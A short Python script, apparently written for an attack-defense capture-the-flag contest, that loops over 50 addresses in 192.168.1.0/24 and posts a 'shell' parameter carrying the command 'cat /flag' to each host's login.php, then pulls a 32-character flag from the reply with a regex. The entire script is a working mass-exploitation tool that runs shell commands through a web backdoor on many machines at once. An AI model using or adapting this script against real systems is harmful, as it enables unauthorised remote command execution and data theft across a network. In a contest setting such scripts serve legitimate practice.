import re
import requests

ips = [f"192.168.1.{i}" for i in range(1, 51)]
data = {"shell": "cat /flag"}
for ip in ips:
    url = 'http://' + ip + '/login.php'
    print(url)
    r = requests.post(url, data=data)  #post执行
    x = r.text
    flag=re.search('[a-z0-9]{32}',x)
    print(url,flag.group())
